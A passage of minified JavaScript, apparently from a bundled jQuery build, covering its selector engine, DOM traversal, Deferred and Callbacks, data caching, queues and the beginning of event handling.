null==r?"!="===e:!e||(r+="","="===e?r===t:"!="===e?r!==t:"^="===e?t&&0===r.indexOf(t):"*="===e?t&&r.indexOf(t)>-1:"$="===e?t&&r.slice(-t.length)===t:"~="===e?(" "+r.replace(M," ")+" ").indexOf(t)>-1:"|="===e&&(r===t||r.slice(0,t.length+1)===t+"-"))}},CHILD:function(n,e,t,a,r){var o="nth"!==n.slice(0,3),i="last"!==n.slice(-4),s="of-type"===e;return 1===a&&0===r?function(n){return!!n.parentNode}:function(e,t,l){var c,p,d,u,m,h=o!==i?"nextSibling":"previousSibling",g=e.parentNode,f=s&&e.nodeName.toLowerCase(),y=!l&&!s,x=!1;if(g){if(o){for(;h;){for(d=e;d=d[h];)if(s?j(d,f):1===d.nodeType)return!1;m=h="only"===n&&!m&&"nextSibling"}return!0}if(m=[i?g.firstChild:g.lastChild],i&&y){for(x=(u=(c=(p=g[b]||(g[b]={}))[n]||[])[0]===v&&c[1])&&c[2],d=u&&g.childNodes[u];d=++u&&d&&d[h]||(x=u=0)||m.pop();)if(1===d.nodeType&&++x&&d===e){p[n]=[v,u,x];break}}else if(y&&(x=u=(c=(p=e[b]||(e[b]={}))[n]||[])[0]===v&&c[1]),!1===x)for(;(d=++u&&d&&d[h]||(x=u=0)||m.pop())&&(!(s?j(d,f):1===d.nodeType)||!++x||(y&&((p=d[b]||(d[b]={}))[n]=[v,x]),d!==e)););return(x-=r)===a||x%a==0&&x/a>=0}}},PSEUDO:function(n,t){var a,r=e.pseudos[n]||e.setFilters[n.toLowerCase()]||Y.error("unsupported pseudo: "+n);return r[b]?r(t):r.length>1?(a=[n,n,"",t],e.setFilters.hasOwnProperty(n.toLowerCase())?en((function(n,e){for(var a,o=r(n,t),i=o.length;i--;)n[a=p.call(n,o[i])]=!(e[a]=o[i])})):function(n){return r(n,0,a)}):r}},pseudos:{not:en((function(n){var e=[],t=[],a=vn(n.replace(B,"$1"));return a[b]?en((function(n,e,t,r){for(var o,i=a(n,null,r,[]),s=n.length;s--;)(o=i[s])&&(n[s]=!(e[s]=o))})):function(n,r,o){return e[0]=n,a(e,null,o,t),e[0]=null,!t.pop()}})),has:en((function(n){return function(e){return Y(n,e).length>0}})),contains:en((function(n){return n=n.replace(G,X),function(e){return(e.textContent||C.text(e)).indexOf(n)>-1}})),lang:en((function(n){return $.test(n||"")||Y.error("unsupported lang: "+n),n=n.replace(G,X).toLowerCase(),function(e){var t;do{if(t=d?e.lang:e.getAttribute("xml:lang")||e.getAttribute("lang"))return(t=t.toLowerCase())===n||0===t.indexOf(n+"-")}while((e=e.parentNode)&&1===e.nodeType);return!1}})),target:function(n){var e=t.location&&t.location.hash;return e&&e.slice(1)===n.id},root:function(n){return n===c},focus:function(n){return n===function(){try{return l.activeElement}catch(n){}}()&&l.hasFocus()&&!!(n.type||n.href||~n.tabIndex)},enabled:on(!1),disabled:on(!0),checked:function(n){return j(n,"input")&&!!n.checked||j(n,"option")&&!!n.selected},selected:function(n){return n.parentNode&&n.parentNode.selectedIndex,!0===n.selected},empty:function(n){for(n=n.firstChild;n;n=n.nextSibling)if(n.nodeType<6)return!1;return!0},parent:function(n){return!e.pseudos.empty(n)},header:function(n){return V.test(n.nodeName)},input:function(n){return H.test(n.nodeName)},button:function(n){return j(n,"input")&&"button"===n.type||j(n,"button")},text:function(n){var e;return j(n,"input")&&"text"===n.type&&(null==(e=n.getAttribute("type"))||"text"===e.toLowerCase())},first:sn((function(){return[0]})),last:sn((function(n,e){return[e-1]})),eq:sn((function(n,e,t){return[t<0?t+e:t]})),even:sn((function(n,e){for(var t=0;t<e;t+=2)n.push(t);return n})),odd:sn((function(n,e){for(var t=1;t<e;t+=2)n.push(t);return n})),lt:sn((function(n,e,t){var a;for(a=t<0?t+e:t>e?e:t;--a>=0;)n.push(a);return n})),gt:sn((function(n,e,t){for(var a=t<0?t+e:t;++a<e;)n.push(a);return n}))}}).pseudos.nth=e.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})e.pseudos[n]=an(n);for(n in{submit:!0,reset:!0})e.pseudos[n]=rn(n);function pn(){}function dn(n,t){var a,r,o,i,s,l,c,p=w[n+" "];if(p)return t?0:p.slice(0);for(s=n,l=[],c=e.preFilter;s;){for(i in a&&!(r=N.exec(s))||(r&&(s=s.slice(r[0].length)||s),l.push(o=[])),a=!1,(r=R.exec(s))&&(a=r.shift(),o.push({value:a,type:r[0].replace(B," ")}),s=s.slice(a.length)),e.filter)!(r=W[i].exec(s))||c[i]&&!(r=c[i](r))||(a=r.shift(),o.push({value:a,type:i,matches:r}),s=s.slice(a.length));if(!a)break}return t?s.length:s?Y.error(n):w(n,l).slice(0)}function un(n){for(var e=0,t=n.length,a="";e<t;e++)a+=n[e].value;return a}function mn(n,e,t){var a=e.dir,r=e.next,o=r||a,i=t&&"parentNode"===o,s=y++;return e.first?function(e,t,r){for(;e=e[a];)if(1===e.nodeType||i)return n(e,t,r);return!1}:function(e,t,l){var c,p,d=[v,s];if(l){for(;e=e[a];)if((1===e.nodeType||i)&&n(e,t,l))return!0}else for(;e=e[a];)if(1===e.nodeType||i)if(p=e[b]||(e[b]={}),r&&j(e,r))e=e[a]||e;else{if((c=p[o])&&c[0]===v&&c[1]===s)return d[2]=c[2];if(p[o]=d,d[2]=n(e,t,l))return!0}return!1}}function hn(n){return n.length>1?function(e,t,a){for(var r=n.length;r--;)if(!n[r](e,t,a))return!1;return!0}:n[0]}function gn(n,e,t,a,r){for(var o,i=[],s=0,l=n.length,c=null!=e;s<l;s++)(o=n[s])&&(t&&!t(o,a,r)||(i.push(o),c&&e.push(s)));return i}function fn(n,e,t,a,r,o){return a&&!a[b]&&(a=fn(a)),r&&!r[b]&&(r=fn(r,o)),en((function(o,i,s,l){var c,d,u,m,h=[],f=[],b=i.length,v=o||function(n,e,t){for(var a=0,r=e.length;a<r;a++)Y(n,e[a],t);return t}(e||"*",s.nodeType?[s]:s,[]),y=!n||!o&&e?v:gn(v,h,n,s,l);if(t?t(y,m=r||(o?n:b||a)?[]:i,s,l):m=y,a)for(c=gn(m,f),a(c,[],s,l),d=c.length;d--;)(u=c[d])&&(m[f[d]]=!(y[f[d]]=u));if(o){if(r||n){if(r){for(c=[],d=m.length;d--;)(u=m[d])&&c.push(y[d]=u);r(null,m=[],c,l)}for(d=m.length;d--;)(u=m[d])&&(c=r?p.call(o,u):h[d])>-1&&(o[c]=!(i[c]=u))}}else m=gn(m===i?m.splice(b,m.length):m),r?r(null,i,m,l):g.apply(i,m)}))}function bn(n){for(var t,r,o,i=n.length,s=e.relative[n[0].type],l=s||e.relative[" "],c=s?1:0,d=mn((function(n){return n===t}),l,!0),u=mn((function(n){return p.call(t,n)>-1}),l,!0),m=[function(n,e,r){var o=!s&&(r||e!=a)||((t=e).nodeType?d(n,e,r):u(n,e,r));return t=null,o}];c<i;c++)if(r=e.relative[n[c].type])m=[mn(hn(m),r)];else{if((r=e.filter[n[c].type].apply(null,n[c].matches))[b]){for(o=++c;o<i&&!e.relative[n[o].type];o++);return fn(c>1&&hn(m),c>1&&un(n.slice(0,c-1).concat({value:" "===n[c-2].type?"*":""})).replace(B,"$1"),r,c<o&&bn(n.slice(c,o)),o<i&&bn(n=n.slice(o)),o<i&&un(n))}m.push(r)}return hn(m)}function vn(n,t){var r,o=[],i=[],s=k[n+" "];if(!s){for(t||(t=dn(n)),r=t.length;r--;)(s=bn(t[r]))[b]?o.push(s):i.push(s);(s=k(n,function(n,t){var r=t.length>0,o=n.length>0,i=function(i,s,c,p,u){var m,h,f,b=0,y="0",x=i&&[],w=[],k=a,S=i||o&&e.find.TAG("*",u),T=v+=null==k?1:Math.random()||.1,j=S.length;for(u&&(a=s==l||s||u);y!==j&&null!=(m=S[y]);y++){if(o&&m){for(h=0,s||m.ownerDocument==l||(cn(m),c=!d);f=n[h++];)if(f(m,s||l,c)){g.call(p,m);break}u&&(v=T)}r&&((m=!f&&m)&&b--,i&&x.push(m))}if(b+=y,r&&y!==b){for(h=0;f=t[h++];)f(x,w,s,c);if(i){if(b>0)for(;y--;)x[y]||w[y]||(w[y]=P.call(p));w=gn(w)}g.apply(p,w),u&&!i&&w.length>0&&b+t.length>1&&C.uniqueSort(p)}return u&&(v=T,a=k),x};return r?en(i):i}(i,o))).selector=n}return s}function yn(n,t,a,r){var o,i,s,l,c,p="function"==typeof n&&n,u=!r&&dn(n=p.selector||n);if(a=a||[],1===u.length){if((i=u[0]=u[0].slice(0)).length>2&&"ID"===(s=i[0]).type&&9===t.nodeType&&d&&e.relative[i[1].type]){if(!(t=(e.find.ID(s.matches[0].replace(G,X),t)||[])[0]))return a;p&&(t=t.parentNode),n=n.slice(i.shift().value.length)}for(o=W.needsContext.test(n)?0:i.length;o--&&(s=i[o],!e.relative[l=s.type]);)if((c=e.find[l])&&(r=c(s.matches[0].replace(G,X),Q.test(i[0].type)&&ln(t.parentNode)||t))){if(i.splice(o,1),!(n=r.length&&un(i)))return g.apply(a,r),a;break}}return(p||vn(n,u))(r,t,!d,a,!t||Q.test(n)&&ln(t.parentNode)||t),a}pn.prototype=e.filters=e.pseudos,e.setFilters=new pn,f.sortStable=b.split("").sort(T).join("")===b,cn(),f.sortDetached=tn((function(n){return 1&n.compareDocumentPosition(l.createElement("fieldset"))})),C.find=Y,C.expr[":"]=C.expr.pseudos,C.unique=C.uniqueSort,Y.compile=vn,Y.select=yn,Y.setDocument=cn,Y.tokenize=dn,Y.escape=C.escapeSelector,Y.getText=C.text,Y.isXML=C.isXMLDoc,Y.selectors=C.expr,Y.support=C.support,Y.uniqueSort=C.uniqueSort}();var O=function(n,e,t){for(var a=[],r=void 0!==t;(n=n[e])&&9!==n.nodeType;)if(1===n.nodeType){if(r&&C(n).is(t))break;a.push(n)}return a},L=function(n,e){for(var t=[];n;n=n.nextSibling)1===n.nodeType&&n!==e&&t.push(n);return t},M=C.expr.match.needsContext,N=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;function R(n,e,t){return b(e)?C.grep(n,(function(n,a){return!!e.call(n,a,n)!==t})):e.nodeType?C.grep(n,(function(n){return n===e!==t})):"string"!=typeof e?C.grep(n,(function(n){return p.call(e,n)>-1!==t})):C.filter(e,n,t)}C.filter=function(n,e,t){var a=e[0];return t&&(n=":not("+n+")"),1===e.length&&1===a.nodeType?C.find.matchesSelector(a,n)?[a]:[]:C.find.matches(n,C.grep(e,(function(n){return 1===n.nodeType})))},C.fn.extend({find:function(n){var e,t,a=this.length,r=this;if("string"!=typeof n)return this.pushStack(C(n).filter((function(){for(e=0;e<a;e++)if(C.contains(r[e],this))return!0})));for(t=this.pushStack([]),e=0;e<a;e++)C.find(n,r[e],t);return a>1?C.uniqueSort(t):t},filter:function(n){return this.pushStack(R(this,n||[],!1))},not:function(n){return this.pushStack(R(this,n||[],!0))},is:function(n){return!!R(this,"string"==typeof n&&M.test(n)?C(n):n||[],!1).length}});var q,U=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(C.fn.init=function(n,e,t){var a,r;if(!n)return this;if(t=t||q,"string"==typeof n){if(!(a="<"===n[0]&&">"===n[n.length-1]&&n.length>=3?[null,n,null]:U.exec(n))||!a[1]&&e)return!e||e.jquery?(e||t).find(n):this.constructor(e).find(n);if(a[1]){if(e=e instanceof C?e[0]:e,C.merge(this,C.parseHTML(a[1],e&&e.nodeType?e.ownerDocument||e:y,!0)),N.test(a[1])&&C.isPlainObject(e))for(a in e)b(this[a])?this[a](e[a]):this.attr(a,e[a]);return this}return(r=y.getElementById(a[2]))&&(this[0]=r,this.length=1),this}return n.nodeType?(this[0]=n,this.length=1,this):b(n)?void 0!==t.ready?t.ready(n):n(C):C.makeArray(n,this)}).prototype=C.fn,q=C(y);var $=/^(?:parents|prev(?:Until|All))/,W={children:!0,contents:!0,next:!0,prev:!0};function H(n,e){for(;(n=n[e])&&1!==n.nodeType;);return n}C.fn.extend({has:function(n){var e=C(n,this),t=e.length;return this.filter((function(){for(var n=0;n<t;n++)if(C.contains(this,e[n]))return!0}))},closest:function(n,e){var t,a=0,r=this.length,o=[],i="string"!=typeof n&&C(n);if(!M.test(n))for(;a<r;a++)for(t=this[a];t&&t!==e;t=t.parentNode)if(t.nodeType<11&&(i?i.index(t)>-1:1===t.nodeType&&C.find.matchesSelector(t,n))){o.push(t);break}return this.pushStack(o.length>1?C.uniqueSort(o):o)},index:function(n){return n?"string"==typeof n?p.call(C(n),this[0]):p.call(this,n.jquery?n[0]:n):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(n,e){return this.pushStack(C.uniqueSort(C.merge(this.get(),C(n,e))))},addBack:function(n){return this.add(null==n?this.prevObject:this.prevObject.filter(n))}}),C.each({parent:function(n){var e=n.parentNode;return e&&11!==e.nodeType?e:null},parents:function(n){return O(n,"parentNode")},parentsUntil:function(n,e,t){return O(n,"parentNode",t)},next:function(n){return H(n,"nextSibling")},prev:function(n){return H(n,"previousSibling")},nextAll:function(n){return O(n,"nextSibling")},prevAll:function(n){return O(n,"previousSibling")},nextUntil:function(n,e,t){return O(n,"nextSibling",t)},prevUntil:function(n,e,t){return O(n,"previousSibling",t)},siblings:function(n){return L((n.parentNode||{}).firstChild,n)},children:function(n){return L(n.firstChild)},contents:function(n){return null!=n.contentDocument&&i(n.contentDocument)?n.contentDocument:(j(n,"template")&&(n=n.content||n),C.merge([],n.childNodes))}},(function(n,e){C.fn[n]=function(t,a){var r=C.map(this,e,t);return"Until"!==n.slice(-5)&&(a=t),a&&"string"==typeof a&&(r=C.filter(a,r)),this.length>1&&(W[n]||C.uniqueSort(r),$.test(n)&&r.reverse()),this.pushStack(r)}}));var V=/[^\x20\t\r\n\f]+/g;function J(n){return n}function Q(n){throw n}function G(n,e,t,a){var r;try{n&&b(r=n.promise)?r.call(n).done(e).fail(t):n&&b(r=n.then)?r.call(n,e,t):e.apply(void 0,[n].slice(a))}catch(n){t.apply(void 0,[n])}}C.Callbacks=function(n){n="string"==typeof n?function(n){var e={};return C.each(n.match(V)||[],(function(n,t){e[t]=!0})),e}(n):C.extend({},n);var e,t,a,r,o=[],i=[],s=-1,l=function(){for(r=r||n.once,a=e=!0;i.length;s=-1)for(t=i.shift();++s<o.length;)!1===o[s].apply(t[0],t[1])&&n.stopOnFalse&&(s=o.length,t=!1);n.memory||(t=!1),e=!1,r&&(o=t?[]:"")},c={add:function(){return o&&(t&&!e&&(s=o.length-1,i.push(t)),function e(t){C.each(t,(function(t,a){b(a)?n.unique&&c.has(a)||o.push(a):a&&a.length&&"string"!==k(a)&&e(a)}))}(arguments),t&&!e&&l()),this},remove:function(){return C.each(arguments,(function(n,e){for(var t;(t=C.inArray(e,o,t))>-1;)o.splice(t,1),t<=s&&s--})),this},has:function(n){return n?C.inArray(n,o)>-1:o.length>0},empty:function(){return o&&(o=[]),this},disable:function(){return r=i=[],o=t="",this},disabled:function(){return!o},lock:function(){return r=i=[],t||e||(o=t=""),this},locked:function(){return!!r},fireWith:function(n,t){return r||(t=[n,(t=t||[]).slice?t.slice():t],i.push(t),e||l()),this},fire:function(){return c.fireWith(this,arguments),this},fired:function(){return!!a}};return c},C.extend({Deferred:function(n){var e=[["notify","progress",C.Callbacks("memory"),C.Callbacks("memory"),2],["resolve","done",C.Callbacks("once memory"),C.Callbacks("once memory"),0,"resolved"],["reject","fail",C.Callbacks("once memory"),C.Callbacks("once memory"),1,"rejected"]],a="pending",r={state:function(){return a},always:function(){return o.done(arguments).fail(arguments),this},catch:function(n){return r.then(null,n)},pipe:function(){var n=arguments;return C.Deferred((function(t){C.each(e,(function(e,a){var r=b(n[a[4]])&&n[a[4]];o[a[1]]((function(){var n=r&&r.apply(this,arguments);n&&b(n.promise)?n.promise().progress(t.notify).done(t.resolve).fail(t.reject):t[a[0]+"With"](this,r?[n]:arguments)}))})),n=null})).promise()},then:function(n,a,r){var o=0;function i(n,e,a,r){return function(){var s=this,l=arguments,c=function(){var t,c;if(!(n<o)){if((t=a.apply(s,l))===e.promise())throw new TypeError("Thenable self-resolution");c=t&&("object"==typeof t||"function"==typeof t)&&t.then,b(c)?r?c.call(t,i(o,e,J,r),i(o,e,Q,r)):(o++,c.call(t,i(o,e,J,r),i(o,e,Q,r),i(o,e,J,e.notifyWith))):(a!==J&&(s=void 0,l=[t]),(r||e.resolveWith)(s,l))}},p=r?c:function(){try{c()}catch(t){C.Deferred.exceptionHook&&C.Deferred.exceptionHook(t,p.error),n+1>=o&&(a!==Q&&(s=void 0,l=[t]),e.rejectWith(s,l))}};n?p():(C.Deferred.getErrorHook?p.error=C.Deferred.getErrorHook():C.Deferred.getStackHook&&(p.error=C.Deferred.getStackHook()),t.setTimeout(p))}}return C.Deferred((function(t){e[0][3].add(i(0,t,b(r)?r:J,t.notifyWith)),e[1][3].add(i(0,t,b(n)?n:J)),e[2][3].add(i(0,t,b(a)?a:Q))})).promise()},promise:function(n){return null!=n?C.extend(n,r):r}},o={};return C.each(e,(function(n,t){var i=t[2],s=t[5];r[t[1]]=i.add,s&&i.add((function(){a=s}),e[3-n][2].disable,e[3-n][3].disable,e[0][2].lock,e[0][3].lock),i.add(t[3].fire),o[t[0]]=function(){return o[t[0]+"With"](this===o?void 0:this,arguments),this},o[t[0]+"With"]=i.fireWith})),r.promise(o),n&&n.call(o,o),o},when:function(n){var e=arguments.length,t=e,a=Array(t),r=s.call(arguments),o=C.Deferred(),i=function(n){return function(t){a[n]=this,r[n]=arguments.length>1?s.call(arguments):t,--e||o.resolveWith(a,r)}};if(e<=1&&(G(n,o.done(i(t)).resolve,o.reject,!e),"pending"===o.state()||b(r[t]&&r[t].then)))return o.then();for(;t--;)G(r[t],i(t),o.reject);return o.promise()}});var X=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;C.Deferred.exceptionHook=function(n,e){t.console&&t.console.warn&&n&&X.test(n.name)&&t.console.warn("jQuery.Deferred exception: "+n.message,n.stack,e)},C.readyException=function(n){t.setTimeout((function(){throw n}))};var K=C.Deferred();function Z(){y.removeEventListener("DOMContentLoaded",Z),t.removeEventListener("load",Z),C.ready()}C.fn.ready=function(n){return K.then(n).catch((function(n){C.readyException(n)})),this},C.extend({isReady:!1,readyWait:1,ready:function(n){(!0===n?--C.readyWait:C.isReady)||(C.isReady=!0,!0!==n&&--C.readyWait>0||K.resolveWith(y,[C]))}}),C.ready.then=K.then,"complete"===y.readyState||"loading"!==y.readyState&&!y.documentElement.doScroll?t.setTimeout(C.ready):(y.addEventListener("DOMContentLoaded",Z),t.addEventListener("load",Z));var Y=function(n,e,t,a,r,o,i){var s=0,l=n.length,c=null==t;if("object"===k(t))for(s in r=!0,t)Y(n,e,s,t[s],!0,o,i);else if(void 0!==a&&(r=!0,b(a)||(i=!0),c&&(i?(e.call(n,a),e=null):(c=e,e=function(n,e,t){return c.call(C(n),t)})),e))for(;s<l;s++)e(n[s],t,i?a:a.call(n[s],s,e(n[s],t)));return r?n:c?e.call(n):l?e(n[0],t):o},nn=/^-ms-/,en=/-([a-z])/g;function tn(n,e){return e.toUpperCase()}function an(n){return n.replace(nn,"ms-").replace(en,tn)}var rn=function(n){return 1===n.nodeType||9===n.nodeType||!+n.nodeType};function on(){this.expando=C.expando+on.uid++}on.uid=1,on.prototype={cache:function(n){var e=n[this.expando];return e||(e={},rn(n)&&(n.nodeType?n[this.expando]=e:Object.defineProperty(n,this.expando,{value:e,configurable:!0}))),e},set:function(n,e,t){var a,r=this.cache(n);if("string"==typeof e)r[an(e)]=t;else for(a in e)r[an(a)]=e[a];return r},get:function(n,e){return void 0===e?this.cache(n):n[this.expando]&&n[this.expando][an(e)]},access:function(n,e,t){return void 0===e||e&&"string"==typeof e&&void 0===t?this.get(n,e):(this.set(n,e,t),void 0!==t?t:e)},remove:function(n,e){var t,a=n[this.expando];if(void 0!==a){if(void 0!==e){t=(e=Array.isArray(e)?e.map(an):(e=an(e))in a?[e]:e.match(V)||[]).length;for(;t--;)delete a[e[t]]}(void 0===e||C.isEmptyObject(a))&&(n.nodeType?n[this.expando]=void 0:delete n[this.expando])}},hasData:function(n){var e=n[this.expando];return void 0!==e&&!C.isEmptyObject(e)}};var sn=new on,ln=new on,cn=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,pn=/[A-Z]/g;function dn(n,e,t){var a;if(void 0===t&&1===n.nodeType)if(a="data-"+e.replace(pn,"-$&").toLowerCase(),"string"==typeof(t=n.getAttribute(a))){try{t=function(n){return"true"===n||"false"!==n&&("null"===n?null:n===+n+""?+n:cn.test(n)?JSON.parse(n):n)}(t)}catch(n){}ln.set(n,e,t)}else t=void 0;return t}C.extend({hasData:function(n){return ln.hasData(n)||sn.hasData(n)},data:function(n,e,t){return ln.access(n,e,t)},removeData:function(n,e){ln.remove(n,e)},_data:function(n,e,t){return sn.access(n,e,t)},_removeData:function(n,e){sn.remove(n,e)}}),C.fn.extend({data:function(n,e){var t,a,r,o=this[0],i=o&&o.attributes;if(void 0===n){if(this.length&&(r=ln.get(o),1===o.nodeType&&!sn.get(o,"hasDataAttrs"))){for(t=i.length;t--;)i[t]&&0===(a=i[t].name).indexOf("data-")&&(a=an(a.slice(5)),dn(o,a,r[a]));sn.set(o,"hasDataAttrs",!0)}return r}return"object"==typeof n?this.each((function(){ln.set(this,n)})):Y(this,(function(e){var t;if(o&&void 0===e)return void 0!==(t=ln.get(o,n))||void 0!==(t=dn(o,n))?t:void 0;this.each((function(){ln.set(this,n,e)}))}),null,e,arguments.length>1,null,!0)},removeData:function(n){return this.each((function(){ln.remove(this,n)}))}}),C.extend({queue:function(n,e,t){var a;if(n)return e=(e||"fx")+"queue",a=sn.get(n,e),t&&(!a||Array.isArray(t)?a=sn.access(n,e,C.makeArray(t)):a.push(t)),a||[]},dequeue:function(n,e){e=e||"fx";var t=C.queue(n,e),a=t.length,r=t.shift(),o=C._queueHooks(n,e);"inprogress"===r&&(r=t.shift(),a--),r&&("fx"===e&&t.unshift("inprogress"),delete o.stop,r.call(n,(function(){C.dequeue(n,e)}),o)),!a&&o&&o.empty.fire()},_queueHooks:function(n,e){var t=e+"queueHooks";return sn.get(n,t)||sn.access(n,t,{empty:C.Callbacks("once memory").add((function(){sn.remove(n,[e+"queue",t])}))})}}),C.fn.extend({queue:function(n,e){var t=2;return"string"!=typeof n&&(e=n,n="fx",t--),arguments.length<t?C.queue(this[0],n):void 0===e?this:this.each((function(){var t=C.queue(this,n,e);C._queueHooks(this,n),"fx"===n&&"inprogress"!==t[0]&&C.dequeue(this,n)}))},dequeue:function(n){return this.each((function(){C.dequeue(this,n)}))},clearQueue:function(n){return this.queue(n||"fx",[])},promise:function(n,e){var t,a=1,r=C.Deferred(),o=this,i=this.length,s=function(){--a||r.resolveWith(o,[o])};for("string"!=typeof n&&(e=n,n=void 0),n=n||"fx";i--;)(t=sn.get(o[i],n+"queueHooks"))&&t.empty&&(a++,t.empty.add(s));return s(),r.promise(e)}});var un=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,mn=new RegExp("^(?:([+-])=|)("+un+")([a-z%]*)$","i"),hn=["Top","Right","Bottom","Left"],gn=y.documentElement,fn=function(n){return C.contains(n.ownerDocument,n)},bn={composed:!0};gn.getRootNode&&(fn=function(n){return C.contains(n.ownerDocument,n)||n.getRootNode(bn)===n.ownerDocument});var vn=function(n,e){return"none"===(n=e||n).style.display||""===n.style.display&&fn(n)&&"none"===C.css(n,"display")};function yn(n,e,t,a){var r,o,i=20,s=a?function(){return a.cur()}:function(){return C.css(n,e,"")},l=s(),c=t&&t[3]||(C.cssNumber[e]?"":"px"),p=n.nodeType&&(C.cssNumber[e]||"px"!==c&&+l)&&mn.exec(C.css(n,e));if(p&&p[3]!==c){for(l/=2,c=c||p[3],p=+l||1;i--;)C.style(n,e,p+c),(1-o)*(1-(o=s()/l||.5))<=0&&(i=0),p/=o;p*=2,C.style(n,e,p+c),t=t||[]}return t&&(p=+p||+l||0,r=t[1]?p+(t[1]+1)*t[2]:+t[2],a&&(a.unit=c,a.start=p,a.end=r)),r}var xn={};function wn(n){var e,t=n.ownerDocument,a=n.nodeName,r=xn[a];return r||(e=t.body.appendChild(t.createElement(a)),r=C.css(e,"display"),e.parentNode.removeChild(e),"none"===r&&(r="block"),xn[a]=r,r)}function kn(n,e){for(var t,a,r=[],o=0,i=n.length;o<i;o++)(a=n[o]).style&&(t=a.style.display,e?("none"===t&&(r[o]=sn.get(a,"display")||null,r[o]||(a.style.display="")),""===a.style.display&&vn(a)&&(r[o]=wn(a))):"none"!==t&&(r[o]="none",sn.set(a,"display",t)));for(o=0;o<i;o++)null!=r[o]&&(n[o].style.display=r[o]);return n}C.fn.extend({show:function(){return kn(this,!0)},hide:function(){return kn(this)},toggle:function(n){return"boolean"==typeof n?n?this.show():this.hide():this.each((function(){vn(this)?C(this).show():C(this).hide()}))}});var Sn,Cn,Tn=/^(?:checkbox|radio)$/i,jn=/<([a-z][^\/\0>\x20\t\r\n\f]*)/i,Pn=/^$|^module$|\/(?:java|ecma)script/i;Sn=y.createDocumentFragment().appendChild(y.createElement("div")),(Cn=y.createElement("input")).setAttribute("type","radio"),Cn.setAttribute("checked","checked"),Cn.setAttribute("name","t"),Sn.appendChild(Cn),f.checkClone=Sn.cloneNode(!0).cloneNode(!0).lastChild.checked,Sn.innerHTML="<textarea>x</textarea>",f.noCloneChecked=!!Sn.cloneNode(!0).lastChild.defaultValue,Sn.innerHTML="<option></option>",f.option=!!Sn.lastChild;var An={thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};function En(n,e){var t;return t=void 0!==n.getElementsByTagName?n.getElementsByTagName(e||"*"):void 0!==n.querySelectorAll?n.querySelectorAll(e||"*"):[],void 0===e||e&&j(n,e)?C.merge([n],t):t}function _n(n,e){for(var t=0,a=n.length;t<a;t++)sn.set(n[t],"globalEval",!e||sn.get(e[t],"globalEval"))}An.tbody=An.tfoot=An.colgroup=An.caption=An.thead,An.th=An.td,f.option||(An.optgroup=An.option=[1,"<select multiple='multiple'>","</select>"]);var Bn=/<|&#?\w+;/;function In(n,e,t,a,r){for(var o,i,s,l,c,p,d=e.createDocumentFragment(),u=[],m=0,h=n.length;m<h;m++)if((o=n[m])||0===o)if("object"===k(o))C.merge(u,o.nodeType?[o]:o);else if(Bn.test(o)){for(i=i||d.appendChild(e.createElement("div")),s=(jn.exec(o)||["",""])[1].toLowerCase(),l=An[s]||An._default,i.innerHTML=l[1]+C.htmlPrefilter(o)+l[2],p=l[0];p--;)i=i.lastChild;C.merge(u,i.childNodes),(i=d.firstChild).textContent=""}else u.push(e.createTextNode(o));for(d.textContent="",m=0;o=u[m++];)if(a&&C.inArray(o,a)>-1)r&&r.push(o);else if(c=fn(o),i=En(d.appendChild(o),"script"),c&&_n(i),t)for(p=0;o=i[p++];)Pn.test(o.type||"")&&t.push(o);return d}var zn=/^([^.]*)(?:\.(.+)|)/;function Dn(){return!0}function Fn(){return!1}function On(n,e,t,a,r,o){var i,s;if("object"==typeof e){for(s in"string"!=typeof t&&(a=a||t,t=void 0),e)On(n,s,t,a,e[s],o);return n}if(null==a&&null==r?(r=t,a=t=void 0):null==r&&("string"==typeof t?(r=a,a=void 0):(r=a,a=t,t=void 0)),!1===r)r=Fn;else if(!r)return n;return 1===o&&(i=r,(r=function(n){return C().off(n),i.apply(this,arguments)}).guid=i.guid||(i.guid=C.guid++)),n.each((function(){C.event.add(this,e,r,a,t)}))}function Ln(n,e,t){t?(sn.set(n,e,!1),C.event.add(n,e,{namespace:!1,handler:function(n){var t,a=sn.get(this,e);if(1&n.isTrigger&&this[e]){if(a)(C.event.special[e]||{}).delegateType&&n.stopPropagation();else if(a=s.call(arguments),sn.set(this,e,a),this[e](),t=sn.get(this,e),sn.set(this,e,!1),a!==t)return n.stopImmediatePropagation(),n.preventDefault(),t}else a&&(sn.set(this,e,C.event.trigger(a[0],a.slice(1),this)),n.stopPropagation(),n.isImmediatePropagationStopped=Dn)}})):void 0===sn.get(n,e)&&C.event.add(n,e,Dn)}C.event={global:{},add:function(n,e,t,a,r){var o,i,s,l,c,p,d,u,m,h,g,f=sn.get(n);if(rn(n))for(t.handler&&(t=(o=t).handler,r=o.selector),r&&C.find.matchesSelector(gn,r),t.guid||(t.guid=C.guid++),(l=f.events)||(l=f.events=Object.create(null)),(i=f.handle)||(i=f.handle=function(e){return void 0!==C&&C.event.triggered!==e.type?C.event.dispatch.apply(n,arguments):void 0}),c=(e=(e||"").match(V)||[""]).length;c--;)m=g=(s=zn.exec(e[c])||[])[1],h=(s[2]||"").split(".").sort(),m&&(d=C.event.special[m]||{},m=(r?d.delegateType:d.bindType)||m,d=C.event.special[m]||{},p=C.extend({type:m,origType:g,data:a,handler:t,guid:t.guid,selector:r,needsContext:r&&C.expr.match.needsContext.test(r),namespace:h.join(".")},o),(u=l[m])||((u=l[m]=[]).delegateCount=0,d.setup&&!1!==d.setup.call(n,a,h,i)||n.addEventListener&&n.addEventListener(m,i)),d.add&&(d.add.call(n,p),p.handler.guid||(p.handler.guid=t.guid)),r?u.splice(u.delegateCount++,0,p):u.push(p),C.event.global[m]=!0)},remove:function(n,e,t,a,r){var o,i,s,l,c,p,d,u,m,h,g,f=sn.hasData(n)&&sn.get(n);if(f&&(l=f.events)){for(c=(e=(e||"").match(V)||[""]).length;c--;)if(m=g=(s=zn.exec(e[c])||[])[1],h=(s[2]||"").split(".").sort(),m){for(d=C.event.special[m]||{},u=l[m=(a?d.delegateType:d.bindType)||m]||[],s=s[2]&&new 